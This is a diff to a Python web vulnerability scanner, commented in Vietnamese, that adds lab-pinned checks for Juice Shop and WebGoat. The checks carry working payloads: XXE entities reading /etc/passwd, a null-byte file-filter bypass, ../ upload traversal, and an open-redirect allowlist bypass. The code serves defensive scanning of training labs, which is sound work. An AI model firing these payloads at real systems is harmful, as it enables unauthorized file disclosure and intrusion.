@@ -2,7 +2,7 @@
 import json
 import re
 import uuid
-from urllib.parse import quote
+from urllib.parse import quote, urlparse
 
 from app.config import settings
 from app.schemas import Finding
@@ -195,6 +195,155 @@ def extended_lab_checks(tools, pages: list[dict]) -> list[Finding]:
     if lab == "webgoat":
         findings.extend(_webgoat_auth_failures(tools, base))
         findings.extend(_webgoat_actuator_exposure(tools, base))
+    return findings
+
+
+def lab_misconfig_checks(tools, pages: list[dict]) -> list[Finding]:
+    """[Kịch bản 4] A02 trên lab: lộ /ftp (Juice Shop), lộ /actuator/env (WebGoat)."""
+    findings: list[Finding] = []
+    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
+    base = "/".join(tools.target_url.split("/", 3)[:3])
+    if lab == "juice-shop":
+        findings.extend(_juice_shop_exposed_ftp(tools, base))
+    if lab == "webgoat":
+        findings.extend(_webgoat_actuator_exposure(tools, base))
+    return findings
+
+
+# Open Redirect ghim theo lab: Juice Shop bảo vệ /redirect bằng allowlist (chỉ cho
+# phép URL chứa một địa chỉ hợp lệ). Lỗ hổng là allowlist dùng phép "chứa chuỗi",
+# nên nhúng một URL hợp lệ vào query của URL ngoài sẽ vượt qua được.
+_OR_EVIL_HOST = "sentinel-redirect.test"
+_OR_ALLOWLISTED = "https://github.com/juice-shop/juice-shop"
+
+
+def _juice_shop_open_redirect(tools, base: str) -> list[Finding]:
+    payload = f"https://{_OR_EVIL_HOST}/evil?x={_OR_ALLOWLISTED}"
+    response = tools.request(base + "/redirect", params={"to": payload}, follow_redirects=False)
+    status = response.get("status", 0)
+    if 300 <= status < 400:
+        location = response.get("headers", {}).get("location", "")
+        # Oracle: Location phải trỏ đúng ra domain ngoài mình đã tiêm.
+        if urlparse(location).netloc.lower() == _OR_EVIL_HOST:
+            return [Finding(
+                category="Open Redirect", severity="medium", url=base + "/redirect", parameter="to",
+                evidence=f"Endpoint /redirect vượt qua được allowlist: payload nhúng một URL hợp lệ vào query khiến máy chủ trả HTTP {status} với Location trỏ ra domain ngoài ({location[:80]}).",
+                recommendation="So khớp đích chuyển hướng với allowlist theo origin tuyệt đối (không dùng phép chứa chuỗi); tốt nhất chỉ cho phép đường dẫn nội bộ.")]
+    return []
+
+
+def lab_open_redirect_checks(tools, pages: list[dict]) -> list[Finding]:
+    """[Kịch bản 8] Open Redirect ghim theo lab (hiện hỗ trợ Juice Shop)."""
+    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
+    base = "/".join(tools.target_url.split("/", 3)[:3])
+    if lab == "juice-shop":
+        return _juice_shop_open_redirect(tools, base)
+    return []
+
+
+_PASSWD_SIG = re.compile(r"root:.*:0:0:")
+
+
+def _juice_shop_path_traversal(tools, base: str) -> list[Finding]:
+    """[Kịch bản 10] Juice Shop /ftp: vượt bộ lọc phần mở rộng bằng null-byte (%2500.md)
+    để tải tệp không nằm trong danh sách cho phép (improper file access / traversal-class)."""
+    target = base + "/ftp/package.json.bak"
+    baseline = tools.request(target)  # 403 khi đi thẳng
+    bypass = tools.request(base + "/ftp/package.json.bak%2500.md")  # null-byte bypass
+    if (baseline.get("status") == 403 and bypass.get("status") == 200
+            and ('"name"' in bypass.get("body", "") or "dependencies" in bypass.get("body", ""))):
+        return [Finding(
+            category="Path Traversal", severity="high", url=base + "/ftp", parameter="(file path)",
+            evidence="Tải tệp /ftp bị chặn (HTTP 403) nhưng chèn null-byte (%2500.md) vượt qua bộ lọc phần mở rộng và trả về nội dung tệp sao lưu (package.json.bak, HTTP 200).",
+            recommendation="Chuẩn hóa và kiểm tra tên tệp phía máy chủ; loại bỏ ký tự null; chỉ phục vụ tệp trong danh sách cho phép.")]
+    return []
+
+
+def _juice_shop_xxe(tools, base: str) -> list[Finding]:
+    """[Kịch bản 11] Juice Shop /file-upload: nạp tệp XML có thực thể ngoài trỏ /etc/passwd.
+    Dù endpoint trả HTTP 410 (deprecated), nội dung tệp vẫn lọt vào phản hồi lỗi."""
+    payload = ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+               '"file:///etc/passwd">]><foo>&xxe;</foo>')
+    benign = '<?xml version="1.0"?><foo>sentinel-benign</foo>'
+    base_resp = tools.client.post(base + "/file-upload", files={"file": ("b.xml", benign, "application/xml")})
+    inj_resp = tools.client.post(base + "/file-upload", files={"file": ("p.xml", payload, "application/xml")})
+    if _PASSWD_SIG.search(inj_resp.text) and not _PASSWD_SIG.search(base_resp.text):
+        return [Finding(
+            category="XXE", severity="high", url=base + "/file-upload", parameter="(XML upload)",
+            evidence="Tệp XML tải lên khai báo thực thể ngoài trỏ /etc/passwd; phản hồi máy chủ chứa chữ ký root:...:0:0: trong khi tệp XML lành tính thì không.",
+            recommendation="Tắt nạp thực thể ngoài/DTD trong bộ phân tích XML và từ chối tải lên XML không cần thiết.")]
+    return []
+
+
+def _webgoat_path_traversal(tools, base: str) -> list[Finding]:
+    """WebGoat PathTraversal/profile-upload: đặt tên tệp chứa ../ để ghi tệp ra
+    ngoài thư mục tải lên. WebGoat tiết lộ đường dẫn tuyệt đối khi traversal thành
+    công; đầu vào lành tính chỉ 'Profile has been updated' (không lộ đường dẫn)."""
+    tools.request(base + "/WebGoat/PathTraversal.lesson")  # khởi tạo bài học trong phiên
+    url = base + "/WebGoat/PathTraversal/profile-upload"
+    img = ("avatar.jpg", b"sentinel-image-bytes", "image/jpeg")
+    benign = tools.client.post(url, files={"uploadedFile": img}, data={"fullName": "sentinel-benign"})
+    injected = tools.client.post(url, files={"uploadedFile": img}, data={"fullName": "../../sentinel-traversal"})
+    disclosed = re.search(r"directory\(|/home/", injected.text)
+    if disclosed and not re.search(r"directory\(|/home/", benign.text):
+        return [Finding(
+            category="Path Traversal", severity="high", url=url, parameter="fullName",
+            evidence="Tên tệp chứa '../' khiến máy chủ ghi tệp tải lên ra ngoài thư mục dự kiến; phản hồi tiết lộ đường dẫn tuyệt đối bị duyệt ngược trong khi tên tệp lành tính thì không.",
+            recommendation="Loại bỏ thành phần đường dẫn trong tên tệp (chỉ giữ basename) và chuẩn hóa đích ghi về thư mục cho phép.")]
+    return []
+
+
+def _webgoat_xxe(tools, base: str) -> list[Finding]:
+    """WebGoat xxe/simple: gửi tài liệu XML có thực thể ngoài. WebGoat tự xác nhận
+    XXE chạy ('Congratulations'); XML lành tính trả 'Sorry'."""
+    tools.request(base + "/WebGoat/XXE.lesson")  # khởi tạo bài học trong phiên
+    url = base + "/WebGoat/xxe/simple"
+    payload = ('<?xml version="1.0"?><!DOCTYPE user [<!ENTITY xxe SYSTEM '
+               '"file:///etc/passwd">]><comment><text>&xxe;</text></comment>')
+    benign = '<?xml version="1.0"?><comment><text>sentinel-benign</text></comment>'
+    inj = tools.request(url, "POST", data=payload, headers={"Content-Type": "application/xml"})
+    base_resp = tools.request(url, "POST", data=benign, headers={"Content-Type": "application/xml"})
+    inj_ok = "Congratulations" in inj.get("body", "") or '"lessonCompleted" : true' in inj.get("body", "")
+    base_ok = "Congratulations" in base_resp.get("body", "") or '"lessonCompleted" : true' in base_resp.get("body", "")
+    if inj_ok and not base_ok:
+        return [Finding(
+            category="XXE", severity="high", url=url, parameter="(XML body)",
+            evidence="Tài liệu XML khai báo thực thể ngoài trỏ /etc/passwd được bộ phân tích nạp (máy chủ xác nhận khai thác thành công), trong khi XML lành tính thì không.",
+            recommendation="Tắt nạp thực thể ngoài/DTD trong bộ phân tích XML (ví dụ cấu hình an toàn cho factory XML).")]
+    return []
+
+
+def lab_path_traversal_checks(tools, pages: list[dict]) -> list[Finding]:
+    """[Kịch bản 10] Path Traversal ghim theo lab (Juice Shop, WebGoat)."""
+    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
+    base = "/".join(tools.target_url.split("/", 3)[:3])
+    if lab == "juice-shop":
+        return _juice_shop_path_traversal(tools, base)
+    if lab == "webgoat":
+        return _webgoat_path_traversal(tools, base)
+    return []
+
+
+def lab_xxe_checks(tools, pages: list[dict]) -> list[Finding]:
+    """[Kịch bản 11] XXE ghim theo lab (Juice Shop, WebGoat)."""
+    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
+    base = "/".join(tools.target_url.split("/", 3)[:3])
+    if lab == "juice-shop":
+        return _juice_shop_xxe(tools, base)
+    if lab == "webgoat":
+        return _webgoat_xxe(tools, base)
+    return []
+
+
+def lab_auth_failure_checks(tools, pages: list[dict]) -> list[Finding]:
+    """[Kịch bản 7] A07 trên lab: đăng nhập sai liên tiếp không bị khóa/giới hạn."""
+    findings: list[Finding] = []
+    lab = next((page.get("lab") for page in pages if page.get("lab")), None)
+    base = "/".join(tools.target_url.split("/", 3)[:3])
+    if lab == "juice-shop":
+        findings.extend(_juice_shop_auth_failures(tools, base))
+    if lab == "webgoat":
+        findings.extend(_webgoat_auth_failures(tools, base))
     return findings
 
 
